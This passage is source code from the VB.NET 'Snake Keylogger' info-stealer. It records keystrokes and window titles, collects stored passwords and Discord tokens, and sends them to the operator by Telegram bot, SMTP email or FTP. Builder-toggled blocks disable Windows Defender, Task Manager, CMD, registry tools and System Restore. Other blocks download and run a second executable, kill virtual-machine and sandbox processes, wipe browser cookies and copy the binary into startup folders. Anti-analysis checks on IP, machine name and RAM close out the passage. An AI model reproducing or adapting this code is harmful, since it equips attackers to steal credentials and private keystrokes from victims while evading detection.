                Dim url As String = String.Concat(New String() {"https://api.telegram.org/bot", TheTelegramToken, "/sendDocument?chat_id=", TheTelegramID, "&caption=", " Pc Name: " & Environment.UserName + " | Snake Keylogger" + vbNewLine + vbNewLine + "Keylogger | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine})
                ClpUploader("SnakeKeylogger" + logRecoverType, "application/x-ms-dos-executable", url, aa)
                Return
            Catch ex As Exception
            End Try
        End If
    End Sub



    Private Sub hook_KeyDown(sender As Object, e As KeyLoggerEventArgs)

        If _currentWindow <> _hook.CurrentWindow Then
            _currentWindow = _hook.CurrentWindow
            Log(String.Format(vbNewLine & "[ -- {0} -- ]" & vbNewLine, _hook.CurrentWindow))
        End If

        Log(String.Format("{0}", e.StringValue))

    End Sub

    Private Sub hook_KeyUp(sender As Object, e As KeyLoggerEventArgs)
        Log(String.Format("{0}", e.StringValue))
    End Sub
    Private Sub Log(ByVal text As String)
        keylogs.Append(text)
    End Sub

    <DllImport("user32.dll")>
    Public Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("user32.dll")>
    Public Function GetWindowText(ByVal hWnd As IntPtr, ByVal text As StringBuilder, ByVal Count As Integer) As Integer
    End Function
    <DllImport("ntdll.dll", SetLastError:=True)>
    Public Function Wekakekakd(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    <DllImport("user32.dll")>
    Public Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")>
    Public Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")>
    Public Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Private Sub StartKeylogger()
        Dim thread As New Thread(Sub()
                                     _hook = New KeyLogger()
                                     AddHandler _hook.KeyDown, AddressOf hook_KeyDown
                                     AddHandler _hook.KeyUp, AddressOf hook_KeyUp
                                     Application.Run()
                                 End Sub)
        thread.Start()
    End Sub
#Region "Keyboard Class"
    Public Delegate Sub KeyLoggerEventArgsEventHandler(ByVal sender As Object, ByVal e As KeyLoggerEventArgs)
    Public Class KeyLoggerEventArgs
        Inherits EventArgs

        Private _keys As Keys
        Private _stringValue As String

        Public Sub New(ByVal key As Keys, ByVal stringValue As String)
            _keys = key
            _stringValue = stringValue
        End Sub

        Public ReadOnly Property Key As Keys
            Get
                Return _keys
            End Get
        End Property


        Public ReadOnly Property StringValue As String
            Get
                Return _stringValue
            End Get
        End Property

    End Class

    Public Class KeyLogger
        Implements IDisposable

        Private Declare Function SetHook Lib "user32" Alias "SetWindowsHookExA" (ByVal hook As Integer, ByVal KeyDelegate As KeyboardProc, ByVal HMod As IntPtr, ByVal ThreadId As Integer) As IntPtr
        Private Declare Function CallNextHook Lib "user32" Alias "CallNextHookEx" (ByVal hook As IntPtr, ByVal code As Integer, ByVal direction As Integer, ByRef key As Keys) As Integer
        Private Declare Function UnHook Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hook As IntPtr) As Integer

        Private Delegate Function KeyboardProc(ByVal code As Integer, ByVal direction As Integer, ByRef key As Keys) As Integer

        Private _hookCallback As New KeyboardProc(AddressOf ProcessKey)
        Private _hook As IntPtr
        Private _currentWindow As String
        Private _newWindow As Boolean

        Public Event KeyDown As KeyLoggerEventArgsEventHandler
        Public Event KeyUp As KeyLoggerEventArgsEventHandler

        Public ReadOnly Property CurrentWindow As String
            Get
                Return _currentWindow
            End Get
        End Property

        Public Sub New()
            _hook = SetHook(13, _hookCallback, IntPtr.Zero, 0)

            If _hook = IntPtr.Zero Then

            End If

            InitializeCaptionLogging()
        End Sub

        Private Function ProcessKey(ByVal code As Integer, ByVal direction As Integer, ByRef key As Keys) As Integer
            If code = 0 Then
                If direction = &H100 Then
                    RaiseEvent KeyDown(Me, New KeyLoggerEventArgs(key, Identifykey(key)))
                ElseIf direction = &H104 Then
                    RaiseEvent KeyUp(Me, New KeyLoggerEventArgs(key, Identifykey(key)))
                End If
            End If
            Return CallNextHook(_hook, code, direction, key)
        End Function

        Private Function Identifykey(ByVal k As Keys) As String
            Dim isuper As Boolean = My.Computer.Keyboard.ShiftKeyDown
            If My.Computer.Keyboard.CapsLock = True Then
                If isuper = True Then
                    isuper = False
                Else
                    isuper = True
                End If
            End If
            Try
                Select Case k
                    Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                        Return "[" & k.ToString & "]"
                    Case Keys.Space
                        Return " "
                    Case Keys.Enter, Keys.Return
                        Return "[ENTR]"
                    Case Keys.Tab
                        Return "[TAP]"
                    Case Else
                        If isuper = True Then
                            Return VKCodeToUnicode(k).ToUpper
                        Else
                            Return VKCodeToUnicode(k)
                        End If
                End Select
            Catch ex As Exception
                If isuper = True Then
                    Return ChrW(k).ToString.ToUpper
                Else
                    Return ChrW(k).ToString.ToLower
                End If
            End Try
        End Function

        Private Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
            Try
                Dim sbString As New System.Text.StringBuilder()
                Dim bKeyState As Byte() = New Byte(254) {}
                Dim bKeyStateStatus As Boolean = COVID19.GetKeyboardState(bKeyState)
                If Not bKeyStateStatus Then
                    Return ""
                End If
                Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
                Dim h As IntPtr = GetForegroundWindow()
                Dim id As Integer = 0
                Dim Aid As Integer = GetWindowThreadProcessId(h, id)
                Dim HKL As IntPtr = GetKeyboardLayout(Aid)
                ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0),
                 HKL)
                Return sbString.ToString()
            Catch ex As Exception
            End Try
            Return CType(VKCode, Keys).ToString
        End Function

        Private Sub InitializeCaptionLogging()
            Dim t As New Thread(Sub()
                                    Do
                                        Dim buffer As New StringBuilder(256)
                                        If GetWindowText(GetForegroundWindow(), buffer, 256) > 0 Then
                                            If buffer.ToString <> _currentWindow Then
                                                _currentWindow = buffer.ToString
                                            End If
                                        End If
                                        Thread.Sleep(1000)
                                    Loop
                                End Sub)
            t.Start()
        End Sub
        Public Sub Dispose() Implements IDisposable.Dispose
            UnHook(_hook)
            GC.SuppressFinalize(Me)
        End Sub

    End Class
#End Region
#End Region


#Region " PSWD Sender"
    Function GetDataPassword() As Byte()
        Dim s As String = "PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
        Dim data As Byte() = Encoding.Unicode.GetBytes(s)

        Return data
    End Function
    Function GetDatauser() As Byte()
        Dim s As String = "PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
        Dim data As Byte() = Encoding.Default.GetBytes(s)

        Return data
    End Function

#Region "pswd timer sender"


    Private Sub TheStoragePWSenderTimer(sender As Object, e As EventArgs) Handles TPSSends.Tick
        'If QJDFjPqkSr = "%FTPDV$" Then






        '    Dim ftpRequest As FtpWebRequest = CType(WebRequest.Create(TheFTPURL + My.Computer.Name + " - Passwords ID - " + PASSWORD + logRecoverType), FtpWebRequest)
        '    Try
        '        ftpRequest.Method = WebRequestMethods.Ftp.UploadFile
        '        ftpRequest.Credentials = New NetworkCredential(TheFTPUsername, TheFTPPSWD)
        '        Dim bytes() As Byte = System.Text.Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------")
        '        ftpRequest.ContentLength = bytes.Length
        '        Using UploadStream As Stream = ftpRequest.GetRequestStream()
        '            UploadStream.Write(bytes, 0, bytes.Length)
        '            UploadStream.Close()

        '        End Using
        '    Catch ex As Exception
        '        Exit Sub
        '    End Try
        'End If



        'If QJDFjPqkSr = "$%SMTPDV$" Then
        '    'Dim Writter As StreamWriter = New StreamWriter(path22)
        '    'Dim aa = "PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
        '    'Writter.Write(aa)
        '    'Writter.Close()

        '    Try
        '        Dim MyMailMessageVAR As New MailMessage()
        '        MyMailMessageVAR.From = New MailAddress(((TheSMTPEmail)))
        '        MyMailMessageVAR.To.Add(((TheSMTPReciver)))
        '        MyMailMessageVAR.Subject = (" Pc Name: " & Environment.UserName + " | Snake Keylogger")
        '        MyMailMessageVAR.Body = ("PW | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine)
        '        Dim data As Byte() = GetDataPassword()


        '        Dim ms As New MemoryStream(data)
        '        MyMailMessageVAR.Attachments.Add(New Attachment(ms, "Passwords" + logRecoverType, "text/plain"))
        '        Dim SMTPVAR As New SmtpClient(TheSMTPServer)
        '        SMTPVAR.EnableSsl = True
        '        SMTPVAR.Port = (TheSMTPPort)
        '        SMTPVAR.Credentials = New System.Net.NetworkCredential(TheSMTPEmail, TheSMTPPSWD)
        '        SMTPVAR.Send(MyMailMessageVAR)
        '        MyMailMessageVAR.Dispose()

        '    Catch ex As Exception

        '    End Try
        'End If



        'If QJDFjPqkSr = "$%TelegramDv$" Then
        '    Try
        '        Dim aa = "PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
        '        ServicePointManager.Expect100Continue = False
        '        ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
        '        Dim url As String = String.Concat(New String() {"https://api.telegram.org/bot", TheTelegramToken, "/sendDocument?chat_id=", TheTelegramID, "&caption=", " Pc Name: " & Environment.UserName + " | Snake Keylogger" + vbNewLine + vbNewLine + "PW | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine})
        '        PWUploader("SnakePW" + logRecoverType, "application/x-ms-dos-executable", url, aa)
        '        Return
        '    Catch ex As Exception
        '    End Try
        'End If



    End Sub

#End Region
#Region "Discord Functions"
    Private Function dotldb(ByRef stringx As String) As Boolean
        Dim flag As Boolean = Directory.Exists(stringx)
        Dim result As Boolean
        If flag Then
            For Each fileInfo As FileInfo In New DirectoryInfo(stringx).GetFiles()
                Dim flag2 As Boolean = fileInfo.Name.EndsWith(".ldb") AndAlso File.ReadAllText(fileInfo.FullName).Contains("oken")
                If flag2 Then
                    stringx += fileInfo.Name
                    Return stringx.EndsWith(".ldb")
                End If
            Next
            result = stringx.EndsWith(".ldb")
        Else
            result = False
        End If
        Return result
    End Function
    Private Function IndexOf(stringx As String) As String
        Dim array As String() = stringx.Substring(stringx.IndexOf("oken") + 4).Split(New Char() {""""c})
        Dim list As List(Of String) = New List(Of String)()
        list.AddRange(array)
        list.RemoveAt(0)
        array = list.ToArray()
        Return String.Join("""", array)
    End Function

    Private Function tokenx(stringx As String, Optional boolx As Boolean = False) As String
        Dim bytes As Byte() = File.ReadAllBytes(stringx)
        Dim [string] As String = Encoding.UTF8.GetString(bytes)
        Dim text As String = ""
        Dim text2 As String = [string]
        While text2.Contains("oken")
            Dim array As String() = IndexOf(text2).Split(New Char() {""""c})
            text = array(0)
            text2 = String.Join("""", array)
            Dim flag As Boolean = boolx AndAlso text.Length = 59
            If flag Then
                Exit While
            End If
        End While
        Return text
    End Function

#End Region


    Sub TheStoragePWSender()
        If QJDFjPqkSr = "%FTPDV$" Then






            Dim ftpRequest As FtpWebRequest = CType(WebRequest.Create(TheFTPURL + My.Computer.Name + " - Passwords ID - " + PASSWORD + logRecoverType), FtpWebRequest)
            Try
                ftpRequest.Method = WebRequestMethods.Ftp.UploadFile
                ftpRequest.Credentials = New NetworkCredential(TheFTPUsername, TheFTPPSWD)
                Dim bytes() As Byte = System.Text.Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------")
                ftpRequest.ContentLength = bytes.Length
                Using UploadStream As Stream = ftpRequest.GetRequestStream()
                    UploadStream.Write(bytes, 0, bytes.Length)
                    UploadStream.Close()

                End Using
            Catch ex As Exception
                Exit Sub
            End Try
        End If



        If QJDFjPqkSr = "$%SMTPDV$" Then
            'Dim Writter As StreamWriter = New StreamWriter(path22)
            'Dim aa = "PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
            'Writter.Write(aa)
            'Writter.Close()

            Try
                Dim MyMailMessageVAR As New MailMessage()
                MyMailMessageVAR.From = New MailAddress(((TheSMTPEmail)))
                MyMailMessageVAR.To.Add(((TheSMTPReciver)))
                MyMailMessageVAR.Subject = (" Pc Name: " & Environment.UserName + " | Snake Keylogger")
                MyMailMessageVAR.Body = ("PW | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine)
                Dim datapass As Byte() = GetDataPassword()
                Dim datauser As Byte() = GetDatauser()

                Dim mspass As New MemoryStream(datapass)
                Dim msuser As New MemoryStream(datauser)
                MyMailMessageVAR.Attachments.Add(New Attachment(mspass, "Passwords" + logRecoverType, "text/plain"))
                MyMailMessageVAR.Attachments.Add(New Attachment(msuser, "User" + logRecoverType, "text/plain"))
                Dim SMTPVAR As New SmtpClient(TheSMTPServer)
                SMTPVAR.EnableSsl = True
                SMTPVAR.Port = (TheSMTPPort)
                SMTPVAR.Credentials = New System.Net.NetworkCredential(TheSMTPEmail, TheSMTPPSWD)
                SMTPVAR.Send(MyMailMessageVAR)
                MyMailMessageVAR.Dispose()

            Catch ex As Exception

            End Try
        End If


        If QJDFjPqkSr = "$%TelegramDv$" Then
            Try
                Dim aa = "PW | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & StoragePW & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
                ServicePointManager.Expect100Continue = False
                ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
                Dim url As String = String.Concat(New String() {"https://api.telegram.org/bot", TheTelegramToken, "/sendDocument?chat_id=", TheTelegramID, "&caption=", " Pc Name: " & Environment.UserName + " | Snake Keylogger" + vbNewLine + vbNewLine + "PW | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine})
                PWUploader("SnakePW" + logRecoverType, "application/x-ms-dos-executable", url, aa)
                Return
            Catch ex As Exception
            End Try
        End If



    End Sub


#End Region


#Region "Anti Bot"

    Public Sub AntiBots()
        Try
            Dim gb As Double
            Dim b2gb As Double = 1024 * 1024 * 1024
            gb = My.Computer.Info.TotalPhysicalMemory / b2gb
            If IPLogger() = "195.239.51.117" Then : ElseIf IPLogger() = "95.26.248.29" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "89.208.29.133" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "89.187.165.47" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "92.118.13.18" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "95.26.253.176" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "1.254.1.255" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "91.132.136.174" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "185.220.101.5" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "34.122.197.93" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "192.64.6.217" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "195.74.76.237" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : ElseIf IPLogger() = "170.55.59.2" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If

            If Environment.MachineName = "John" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "admin" And gb < 3.5 Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "Admin" And gb < 3.5 Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "ADMIN" And gb < 3.5 Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "USER" And gb < 3.5 Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "User" And gb < 3.5 Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "user" And gb < 3.5 Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "JOHN" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "JOHN-PC" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "John-PC" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "WALKER-PC" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If
            If Environment.MachineName = "WALKER" Then : System.Diagnostics.Process.GetCurrentProcess().Kill() : End If




            '           If TheHardDiskSpace() < 112 Then
            '               System.Diagnostics.Process.GetCurrentProcess().Kill()
            '          End If


            If gb < 3.5 Then
                System.Diagnostics.Process.GetCurrentProcess().Kill()
            End If

        Catch ex As Exception

        End Try
    End Sub


    Public Function TheHardDiskSpace2()
        Dim allDrives() As IO.DriveInfo = IO.DriveInfo.GetDrives()
        Dim totalbytes As Long
        Dim d As IO.DriveInfo
        For Each d In allDrives
            If d.IsReady = True Then
                totalbytes += d.TotalSize
            End If
        Next
        totalbytes = totalbytes / 1048576 / 1024
        Dim Outputs As String = totalbytes
        Return Outputs
    End Function

#End Region

    <STAThread()>
    Sub Main()



        '==================== Features ====================

        '%FeaDelay% 

        '$AnTiiBo%% AntiBots()





        '%FakeMessagebox% MsgBox("$Msg$", MsgBoxStyle.$METHOD$, "$Title$")

        '%SelfHidden%    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden Or FileAttributes.System)

        '%OpenWebsites%  System.Diagnostics.Process.Start("WEBSITETOSTART")

        '%MeltFile% MeltMele()




        '%Disable_Defender% Try
        '%Disable_Defender% My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1", Microsoft.Win32.RegistryValueKind.DWord)	
        '%Disable_Defender% Catch ex As Exception
        '%Disable_Defender% End Try

        '%Restores_Disabler% Try
        '%Restores_Disabler% My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)	
        '%Restores_Disabler% Catch ex As Exception
        '%Restores_Disabler% End Try


        '%Taskmgr_Disabler% Try
        '%Taskmgr_Disabler% My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
        '%Taskmgr_Disabler% Catch ex As Exception
        '%Taskmgr_Disabler% End Try

        '%CMD_Disabler% Try
        '%CMD_Disabler% My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)	
        '%CMD_Disabler% Catch ex As Exception
        '%CMD_Disabler% End Try

        '%Registeries_Disabler% Try
        '%Registeries_Disabler% Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
        '%Registeries_Disabler% Catch ex As Exception
        '%Registeries_Disabler%w End Try



        '%DownloaderStub%     Try
        '%DownloaderStub%        If IO.File.Exists(IO.Path.GetTempPath & "%file.exe%") Then
        '%DownloaderStub%          IO.File.Delete(IO.Path.GetTempPath & "%file.exe%")
        '%DownloaderStub%         My.Computer.Network.DownloadFile("%url1%", IO.Path.GetTempPath & "%file.exe%")
        '%DownloaderStub%           Process.Start(IO.Path.GetTempPath & "%file.exe%")
        '%DownloaderStub%           Else
        '%DownloaderStub%              My.Computer.Network.DownloadFile("%url1%", IO.Path.GetTempPath & "%file.exe%")
        '%DownloaderStub%                Process.Start(IO.Path.GetTempPath & "%file.exe%")
        '%DownloaderStub%         End If
        '%DownloaderStub%     Catch ex As Exception
        '%DownloaderStub%    End Try





        '%ProcessTaskKiller% Try
        '%ProcessTaskKiller% 	kLLTIm.Interval = 10
        '%ProcessTaskKiller% 	kLLTIm.Start
        '%ProcessTaskKiller% 	Catch Z As Exception
        '%ProcessTaskKiller% 	End Try


        '%ProcessHackerBodygard%  ProHfutimer.Interval = 1
        '%ProcessHackerBodygard%  ProHfutimer.Start()


        '%Chromes_Killer%   Try
        '%Chromes_Killer%       Chrome_Killer()
        '%Chromes_Killer%       Catch ex As Exception
        '%Chromes_Killer%        End Try

        '%AnTiV'M_Killer% Killme("Vmtoolsd")
        '%AnTiV'M_Killer% Killme("Vmwaretrat")
        '%AnTiV'M_Killer% Killme("Vmwareuser")
        '%AnTiV'M_Killer% Killme("Vmacthlp")
        '%AnTiV'M_Killer% Killme("vboxservice")
        '%AnTiV'M_Killer% Killme("vboxtray")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\Vmmouse.sys")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\vm3dgl.dll")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\vmtray.dll")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\VMToolsHook.dll")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\vmmousever.dll")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\VBoxMouse.sys")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\VBoxGuest.sys")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\VBoxSF.sys")
        '%AnTiV'M_Killer% killz("C:\windows\System32\Drivers\VBoxVideo.sys")
        '%AnTiV'M_Killer% killz("C:\windows\System32\vboxservice.exe")

        '%AnTiSandboxie_Killer% Killme("SandboxieRpcSs")




        '%Cookies_Eraser%  Dim Cookies As String = Environment.GetFolderPath(Environment.SpecialFolder.Cookies)
        '%Cookies_Eraser%   If System.IO.Directory.Exists(Cookies) Then
        '%Cookies_Eraser%  For Each File As String In My.Computer.FileSystem.GetFiles(Cookies)
        '%Cookies_Eraser% Try
        '%Cookies_Eraser%      My.Computer.FileSystem.DeleteFile(File)
        '%Cookies_Eraser%           Catch
        '%Cookies_Eraser%      End Try
        '%Cookies_Eraser%       Next
        '%Cookies_Eraser%      End If

        '%Cookies_Eraser%     Try
        '%Cookies_Eraser%   Dim ChromeCookiesss As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\Cookies"
        '%Cookies_Eraser%    My.Computer.FileSystem.DeleteFile(ChromeCookiesss)
        '%Cookies_Eraser%    Catch ex As Exception
        '%Cookies_Eraser%    End Try
        '%Cookies_Eraser%    Try
        '%Cookies_Eraser%    Dim ChromeCookies222 As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\Extension Cookies"
        '%Cookies_Eraser%    My.Computer.FileSystem.DeleteFile(ChromeCookies222)
        '%Cookies_Eraser%     Catch ex As Exception
        '%Cookies_Eraser%     End Try

        '%Cookies_Eraser%   Try
        '%Cookies_Eraser% Dim MozillaCookiess As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Mozilla\Firefox\Profiles"
        '%Cookies_Eraser%   If System.IO.Directory.Exists(MozillaCookiess) Then
        '%Cookies_Eraser%   For Each mozillaCookiesProfiles As String In My.Computer.FileSystem.GetDirectories(MozillaCookiess)
        '%Cookies_Eraser%   For Each mozillaCookielikelikelikelikelike As String In My.Computer.FileSystem.GetFiles(mozillaCookiesProfiles)
        '%Cookies_Eraser%                   If mozillaCookielikelikelikelikelike.Contains("signon") Then
        '%Cookies_Eraser%  Try
        '%Cookies_Eraser%   My.Computer.FileSystem.DeleteFile(mozillaCookielikelikelikelikelike)
        '%Cookies_Eraser%   Catch
        '%Cookies_Eraser%    End Try
        '%Cookies_Eraser%    End If
        '%Cookies_Eraser%    Next
        '%Cookies_Eraser%    Next
        '%Cookies_Eraser%     End If
        '%Cookies_Eraser%      Catch ex As Exception
        '%Cookies_Eraser%      End Try


        '====================  Features End  ====================




        '==================== Logger ====================

        '%Clipboard_Logger%     Try
        '%Clipboard_Logger%     Clpreptimerr.Start()
        '%Clipboard_Logger%     Clpreptimerr.Interval = 100
        '%Clipboard_Logger%     Catch c As Exception
        '%Clipboard_Logger%     End Try

        '%Clipboard_Logger%     Try
        '%Clipboard_Logger%     clprEPs.Start()  
        '%Clipboard_Logger%     clprEPs.Interval = 3211234
        '%Clipboard_Logger%     Catch c As Exception
        '%Clipboard_Logger%     End Try

        '%Screenshots_Logger%   Try
        '%Screenshots_Logger% 	Scrlogtimerrr.Start
        '%Screenshots_Logger% 	Scrlogtimerrr.Interval = 9877896
        '%Screenshots_Logger% 	Catch Z As Exception
        '%Screenshots_Logger%  	End Try


        '%Keyboards_Logger%     Try
        '%Keyboards_Logger%  	KPPlogS.Start
        '%Keyboards_Logger%     KPPlogS.Interval = 4566547
        '%Keyboards_Logger%     StartKeylogger()
        '%Keyboards_Logger%  	Catch v As Exception
        '%Keyboards_Logger%   	End Try


        '%Voice_Logger%     Try
        '%Voice_Logger%  	TheVoiceSenderTimer.Start
        '%Voice_Logger%     TheVoiceSenderTimer.Interval = 13132424
        '%Voice_Logger%  	Catch v As Exception
        '%Voice_Logger%   	End Try

        '====================  Logger END  ====================




        '==================== Startup ====================

        'Jsk$     Try

        'stddddrrrrr   System.IO.File.Copy(Application.ExecutablePath, System.Environment.GetEnvironmentVariable("AppData") + "\%nmoufstr%.exe", true) 
        'stddddrrrrr  System.IO.File.WriteAllText(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup) + "/%nmoufstr%.url", "[InternetShortcut]" + Environment.NewLine + "URL=file:///" + System.Environment.GetEnvironmentVariable("AppData") + "\%nmoufstr%.exe")

        'wndrssss    System.IO.File.Copy(Application.ExecutablePath, System.Environment.GetEnvironmentVariable("Windir") + "\%nmoufstr^%.exe", true)
        'wndrssss    System.IO.File.WriteAllText(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup) + "/%nmoufstr^%.url", "[InternetShortcut]" + Environment.NewLine + "URL=file:///" + System.Environment.GetEnvironmentVariable("Windir") + "\%nmoufstr^%.exe")

        'tmppssss  System.IO.File.Copy(Application.ExecutablePath, System.Environment.GetEnvironmentVariable("Temp") + "\%nmoufstr%.exe", true)
        'tmppssss  System.IO.File.WriteAllText(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup) + "/%nmoufstr%.url", "[InternetShortcut]" + Environment.NewLine + "URL=file:///" + System.Environment.GetEnvironmentVariable("Temp") + "\%nmoufstr%.exe")

        'mpiccsssssss   System.IO.File.Copy(Application.ExecutablePath, System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyPictures) + "\%nmoufstr@%.exe", true)
        'mpiccsssssss System.IO.File.WriteAllText(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup) + "/%nmoufstr@%.url", "[InternetShortcut]" + Environment.NewLine + "URL=file:///" + System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyPictures) + "\%nmoufstr@%.exe")


        'mdocsssss	 System.IO.File.Copy(Application.ExecutablePath, System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments) + "\%nmoufstr@%.exe", true)
        'mdocsssss  System.IO.File.WriteAllText(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup) + "/%nmoufstr@%.url", "[InternetShortcut]" + Environment.NewLine + "URL=file:///" + System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments) + "\%nmoufstr@%.exe");

